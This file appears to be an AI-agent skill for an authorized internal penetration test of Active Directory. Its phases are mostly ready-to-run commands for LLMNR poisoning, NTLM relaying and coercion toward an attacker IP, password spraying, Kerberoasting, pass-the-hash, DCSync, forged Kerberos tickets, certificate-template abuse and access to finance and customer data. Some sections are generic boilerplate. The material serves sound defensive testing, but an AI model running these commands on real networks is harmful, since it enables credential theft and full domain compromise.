---
name: conducting-internal-network-penetration-test
description: Execute an internal network penetration test simulating an insider threat or post-breach attacker to identify
  lateral movement paths, privilege escalation vectors, and sensitive data exposure within the corporate network. Use when working with conducting internal network penetration test.
domain: cybersecurity
subdomain: penetration-testing
tags:
- internal-pentest
- lateral-movement
- privilege-escalation
- Responder
- Impacket
- assumed-breach
- network-security
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Application Protocol Command Analysis
- Network Isolation
- Network Traffic Analysis
- Client-server Payload Profiling
- Network Traffic Community Deviation
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
---

# Conducting Internal Network Penetration Test

## Overview

An internal network penetration test simulates an attacker who has already gained access to the internal network or a malicious insider. The tester operates from an "assumed breach" position — typically a standard domain workstation or network jack — and attempts lateral movement, privilege escalation, credential harvesting, and data exfiltration to determine the blast radius of a compromised endpoint.


## When to Use
**Trigger phrases:**
- "conducting internal network penetration test"
- "Execute an internal network penetration test simulating an insider threat or pos"


- When conducting security assessments that involve conducting internal network penetration test
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Signed Rules of Engagement with internal network scope
- Network access: physical Ethernet drop or VPN connection to internal VLAN
- Standard domain user credentials (assumed breach model) or unauthenticated access
- Testing laptop with Kali Linux, Impacket, Responder, BloodHound
- Coordination with IT/SOC for monitoring and emergency contacts


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Phase 1 — Network Discovery and Enumeration

This section covers phase 1 — network discovery and enumeration for conducting internal network penetration test.

- Ensure all prerequisites are met before proceeding
- Follow the documented workflow steps in sequence
- Record results and any anomalies encountered during this phase
### Initial Network Reconnaissance

```bash
# Identify your own network position
ip addr show
ip route show
cat /etc/resolv.conf

# ARP scan for live hosts on local subnet
arp-scan --localnet --interface eth0

# Nmap host discovery across internal ranges
nmap -sn 10.0.0.0/8 --exclude 10.0.0.1 -oG internal_hosts.gnmap
nmap -sn 172.16.0.0/12 -oG internal_hosts_172.gnmap
nmap -sn 192.168.0.0/16 -oG internal_hosts_192.gnmap

# Extract live hosts
grep "Status: Up" internal_hosts.gnmap | awk '{print $2}' > live_hosts.txt

# Port scan live hosts — top 1000 ports
nmap -sS -sV -T4 -iL live_hosts.txt -oA internal_tcp_scan

# Service-specific scans
nmap -p 445 --open -iL live_hosts.txt -oG smb_hosts.gnmap
nmap -p 3389 --open -iL live_hosts.txt -oG rdp_hosts.gnmap
nmap -p 22 --open -iL live_hosts.txt -oG ssh_hosts.gnmap
nmap -p 1433,3306,5432,1521,27017 --open -iL live_hosts.txt -oG db_hosts.gnmap
```

### Active Directory Enumeration

```bash
# Enumerate domain information with domain credentials
# Using CrackMapExec / NetExec
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --shares
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --users
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --groups

# LDAP enumeration
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf

# Enumerate Group Policy Objects
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --lsa

# BloodHound data collection
bloodhound-python -u 'testuser' -p 'Password123' -d corp.local -ns 10.0.0.5 -c all
# Import JSON files into BloodHound GUI for attack path analysis

# Enum4linux-ng for legacy enumeration
enum4linux-ng -A 10.0.0.5 -u 'testuser' -p 'Password123'
```

### Network Service Enumeration

```bash
# SMB share enumeration
smbclient -L //10.0.0.10 -U 'testuser%Password123'
smbmap -H 10.0.0.10 -u 'testuser' -p 'Password123' -R

# SNMP enumeration
snmpwalk -v2c -c public 10.0.0.1

# DNS zone transfer attempt
dig axfr corp.local @10.0.0.5

# NFS enumeration
showmount -e 10.0.0.15

# MSSQL enumeration
impacket-mssqlclient 'corp.local/testuser:Password123@10.0.0.20' -windows-auth
```

## Phase 2 — Credential Attacks

This section covers phase 2 — credential attacks for conducting internal network penetration test.

- Ensure all prerequisites are met before proceeding
- Follow the documented workflow steps in sequence
- Record results and any anomalies encountered during this phase
### Network Credential Capture

```bash
# Responder — LLMNR/NBT-NS/mDNS poisoning
sudo responder -I eth0 -dwPv

# Capture NTLMv2 hashes from Responder logs
cat /usr/share/responder/logs/NTLMv2-*.txt

# mitm6 — IPv6 DNS takeover
sudo mitm6 -d corp.local

# ntlmrelayx — relay captured credentials
impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks

# PetitPotam — coerce NTLM authentication
python3 PetitPotam.py -u 'testuser' -p 'Password123' -d corp.local \
  attacker_ip 10.0.0.5
```

### Password Attacks

```bash
# Crack captured NTLMv2 hashes
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Password spraying (careful with lockout policies)
netexec smb 10.0.0.5 -u users.txt -p 'Spring2025!' --no-bruteforce
netexec smb 10.0.0.5 -u users.txt -p 'Company2025!' --no-bruteforce

# Kerberoasting — target service accounts
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
  -outputfile kerberoast_hashes.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting — target accounts without pre-auth
impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.0.0.5 \
  -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Phase 3 — Exploitation and Lateral Movement

This section covers phase 3 — exploitation and lateral movement for conducting internal network penetration test.

- Ensure all prerequisites are met before proceeding
- Follow the documented workflow steps in sequence
- Record results and any anomalies encountered during this phase
### Lateral Movement Techniques

```bash
# Pass-the-Hash with Impacket
impacket-psexec 'corp.local/admin@10.0.0.30' -hashes :aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b

# WMI execution
impacket-wmiexec 'corp.local/admin:AdminPass123@10.0.0.30'

# Evil-WinRM for PowerShell remoting
evil-winrm -i 10.0.0.30 -u admin -p 'AdminPass123'

# SMBExec
impacket-smbexec 'corp.local/admin:AdminPass123@10.0.0.30'

# RDP access
xfreerdp /v:10.0.0.30 /u:admin /p:'AdminPass123' /cert-ignore /dynamic-resolution

# SSH pivoting
ssh -D 9050 user@10.0.0.40
proxychains nmap -sT -p 80,443,445,3389 10.10.0.0/24
```

### Privilege Escalation

```bash
# Windows privilege escalation
# Check for local admin via token impersonation
meterpreter> getsystem
meterpreter> run post/multi/recon/local_exploit_suggester

# PowerShell-based privesc checks
# Run PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# Check for unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

# Linux privilege escalation
./linpeas.sh
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

### Domain Escalation

```bash
# DCSync attack (requires replication rights)
impacket-secretsdump 'corp.local/domainadmin:DaPass123@10.0.0.5' -just-dc

# Golden Ticket attack
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local administrator

# Silver Ticket attack
impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn MSSQL/db01.corp.local administrator

# ADCS exploitation (Certifried, ESC1-ESC8)
certipy find -u 'testuser@corp.local' -p 'Password123' -dc-ip 10.0.0.5
certipy req -u 'testuser@corp.local' -p 'Password123' -target ca01.corp.local \
  -template VulnerableTemplate -ca CORP-CA -upn administrator@corp.local
```

## Phase 4 — Data Access and Impact Demonstration

```bash
# Access sensitive file shares
smbclient //10.0.0.10/Finance -U 'domainadmin%DaPass123'
> dir
> get Q4_Financial_Report.xlsx

# Database access
impacket-mssqlclient 'sa:DbPassword123@10.0.0.20'
SQL> SELECT name FROM sys.databases;
SQL> SELECT TOP 10 * FROM customers;

# Extract proof of access (DO NOT exfiltrate real data)
echo "PENTEST-PROOF-INTERNAL-$(date +%Y%m%d)" > /tmp/proof.txt

# Document access chain
# Initial Access -> Responder -> NTLMv2 crack -> Lateral to WS01
# -> Local admin -> Mimikatz -> DA creds -> DCSync -> Full domain compromise
```

## Phase 5 — Reporting

This section covers phase 5 — reporting for conducting internal network penetration test.

- Ensure all prerequisites are met before proceeding
- Follow the documented workflow steps in sequence
- Record results and any anomalies encountered during this phase
### Attack Path Documentation

```
Attack Path 1: Domain Compromise via LLMNR Poisoning
  Step 1: LLMNR/NBT-NS poisoning captured NTLMv2 hash (T1557.001)
  Step 2: Hash cracked offline — user: jsmith, password: Welcome2025!
  Step 3: jsmith had local admin on WS042 — lateral movement via PsExec (T1021.002)
  Step 4: Mimikatz extracted DA credentials from WS042 memory (T1003.001)
  Step 5: DCSync with DA credentials — all domain hashes extracted (T1003.006)
  Impact: Complete domain compromise from unauthenticated network position
```

### Findings Severity Matrix

| Finding | CVSS | MITRE ATT&CK | Remediation |
|---------|------|---------------|-------------|
| LLMNR/NBT-NS poisoning | 8.1 | T1557.001 | Disable LLMNR/NBT-NS via GPO |
| Kerberoastable service accounts | 7.5 | T1558.003 | Use gMSA, 25+ char passwords |
| Local admin reuse | 8.4 | T1078 | Deploy LAPS, unique local admin passwords |
| Weak domain passwords | 7.2 | T1110 | Enforce 14+ char minimum, blacklist common passwords |
| Unrestricted DCSync | 9.8 | T1003.006 | Audit replication rights, implement tiered admin model |

## Tools Reference

| Tool | Purpose |
|------|---------|
| Responder | LLMNR/NBT-NS/mDNS poisoning |
| Impacket | AD attack suite (secretsdump, psexec, wmiexec, etc.) |
| BloodHound | AD attack path visualization |
| NetExec (CrackMapExec) | Network service enumeration and spraying |
| Evil-WinRM | PowerShell remoting client |
| Certipy | AD Certificate Services exploitation |
| Mimikatz | Windows credential extraction |
| Hashcat | Password hash cracking |
| Nmap | Network scanning and enumeration |
| LinPEAS/WinPEAS | Privilege escalation enumeration |

## When NOT to Use

- You don't have authorization for the assessment
- Task is about implementing findings (use implementing-* skills)
- You need to analyze results (use analyzing-* skills)
- Task is about building assessment tools (use building-* skills)
- Target is out of scope
- Task requires compliance certification (use auditing-* skills)


## Red Flags

- Performing actions without explicit written authorization from the asset owner
- Testing against production systems without a defined scope and rules of engagement
- Capturing traffic on networks without authorization or privacy considerations
- Leaving packet captures containing sensitive data unencrypted on disk
- Deploying inline blocking rules without testing for false positives first

## Verification

- All steps executed successfully against a test environment before production use
- Output documented with screenshots or logs demonstrating expected behavior
- Captures verified as complete with no dropped packets
- Detection rules tested against known-benign traffic for false positive rate
- Alert thresholds validated and tuned to reduce noise

## References

- Cobalt Internal Network Pentesting Methodology: https://docs.cobalt.io/methodologies/internal-network/
- MITRE ATT&CK Enterprise: https://attack.mitre.org/matrices/enterprise/
- PTES: http://www.pentest-standard.org/
- Impacket: https://github.com/fortra/impacket
- BloodHound: https://github.com/BloodHoundAD/BloodHound

## Process

1. Analyze the task requirements
2. Apply domain expertise
3. Verify output quality

## Anti-Rationalization

| Rationalization | Reality |
|---|---|
| "We are too small to be targeted" | Automated attacks target everyone. Size does not matter. |
| "Security slows us down" | A breach slows you down 100x more. Build security in from the start. |
| "We will fix it after launch" | Vulnerabilities in production are exploited within hours. Fix before deploy. |